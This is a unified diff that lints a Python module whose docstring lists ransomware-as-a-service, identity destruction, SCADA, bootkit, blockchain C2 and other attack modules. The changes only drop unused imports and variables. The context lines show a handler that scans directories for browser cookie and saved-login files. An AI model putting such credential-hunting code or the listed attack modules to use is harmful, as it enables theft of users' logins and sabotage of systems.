@@ -4,16 +4,11 @@ Blocks 1-4 + Bonus: Psychological, Identity, RaaS, Multi-platform, Supply Chain,
 Cloud, Bluetooth, SCADA, Hardware Kill, Network Poison, DNA, Bootkit, Blockchain C2, Survivor.
 """
 
-import json
 import os
 import random
-import socket
-import struct
 import subprocess
-import sys
 import tempfile
 from datetime import datetime, timedelta, timezone
-from typing import Any
 
 try:
     from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -130,7 +125,7 @@ def handle_identity_destroy(params: dict) -> dict:
                 if fn.lower() in ("cookies", "cookies.sqlite", "logins.json", "login data"):
                     fpath = os.path.join(dirpath, fn)
                     try:
-                        fsize = os.path.getsize(fpath)
+                        os.path.getsize(fpath)
                         if fn.lower() in ("cookies", "cookies.sqlite"):
                             cookies_found += 1
                         else:
@@ -743,7 +738,6 @@ def handle_survivor_game(params: dict) -> dict:
             "eliminated": False,
         })
 
-    game_active = True
     eliminated = []
     remaining = list(stations)
 
@@ -762,7 +756,6 @@ def handle_survivor_game(params: dict) -> dict:
         eliminated.append(target)
 
     winner = remaining[0] if remaining else None
-    game_active = False
 
     return {
         "success": True,
